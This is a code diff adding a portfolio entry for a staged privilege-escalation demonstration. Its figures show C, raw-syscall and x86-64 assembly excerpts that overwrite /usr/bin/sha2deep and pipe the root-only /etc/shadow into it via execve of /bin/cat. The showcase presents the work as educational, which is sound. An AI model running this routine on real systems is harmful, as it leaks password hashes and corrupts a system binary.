@@ -212,6 +212,86 @@ interface GigabitEthernet1/0/1
       },
     ],
   },
+  {
+    slug: 'privilege-escalation-setuid',
+    title: 'Privilege Escalation via Setuid Binary',
+    tagline:
+      'A staged privilege-escalation demonstration that reads /etc/shadow through a setuid binary — escalating from a shell script, to C, to raw syscalls, to hand-written x86-64 assembly.',
+    github: 'https://github.com/jdtherobot/privilege-escalation--setuid-binary-',
+    tags: ['C', 'x86-64 Assembly', 'Privilege escalation'],
+    featured: true,
+    // Progression writeup, split doc-per-stage. The docs below are byte-for-byte
+    // slices of the repo's single writeup.md, cut at its own section headings;
+    // the overview's H1 is the sole edit (repo slug → a readable title). Figure
+    // code is a faithful excerpt of each stage's real source.
+    figure: {
+      filename: 'wrapper.c',
+      code: `// read root-only /etc/shadow via a setuid wrapper
+long fd = syscall3(2, (long)"/usr/bin/sha2deep", 01101, 0600);
+syscall3(33, fd, 1, 0);            // dup2 -> stdout
+char *args[] = {"/bin/cat", "/etc/shadow", 0};
+syscall3(59, (long)"/bin/cat", (long)args, 0);   // execve`,
+    },
+    docs: [
+      { docSlug: 'overview', title: 'Overview', file: 'README.md' },
+      {
+        docSlug: 'c-wrapper',
+        title: 'C Wrapper',
+        tab: 'C Wrapper',
+        file: 'c-wrapper.md',
+        snippet:
+          'The first working version — open the target file, redirect stdout onto it with dup2, then hand off to /bin/cat through execve.',
+        figure: {
+          filename: 'wrapper.c',
+          code: `int fd = open("/usr/bin/sha2deep",
+              O_WRONLY | O_CREAT | O_TRUNC, 0600);
+dup2(fd, STDOUT_FILENO);   // cat writes into the fd
+char *args[] = {"/bin/cat", "/etc/shadow", NULL};
+execve("/bin/cat", args, NULL);`,
+        },
+      },
+      {
+        docSlug: 'syscalls',
+        title: 'C Wrapper with Syscalls',
+        tab: 'Syscalls',
+        file: 'syscalls.md',
+        snippet:
+          'libc stripped out: open, dup2, close and execve driven through a hand-rolled inline-assembly syscall helper, then reduced to raw octal flags.',
+        figure: {
+          filename: 'wrapper.c',
+          code: `static inline long syscall3(long num,
+                            long a1, long a2, long a3) {
+    long ret;
+    __asm__ __volatile__(
+        "syscall"
+        : "=a"(ret)
+        : "a"(num), "D"(a1), "S"(a2), "d"(a3)
+        : "rcx", "r11", "memory");
+    return ret;
+}`,
+        },
+      },
+      {
+        docSlug: 'assembly',
+        title: 'x86-64 Assembly Implementation',
+        tab: 'Assembly',
+        file: 'assembly.md',
+        snippet:
+          'No compiler at all — syscalls invoked directly in x86-64, every path string built on the stack in Little-Endian, registers loaded by hand.',
+        figure: {
+          filename: 'wrapper.asm',
+          code: `; push "///usr/bin/sha2deep" in reverse (LE)
+push 0x00706565             ; "eep\\0"
+mov  rbx, 0x64326168732f6e69 ; "in/sha2d"
+push rbx
+mov  rsi, 577               ; flags 01101 octal
+mov  rdx, 384               ; mode  0600 octal
+mov  rax, 2                 ; sys_open
+syscall`,
+        },
+      },
+    ],
+  },
 ]
 
 export function findProject(slug: string): Project | undefined {
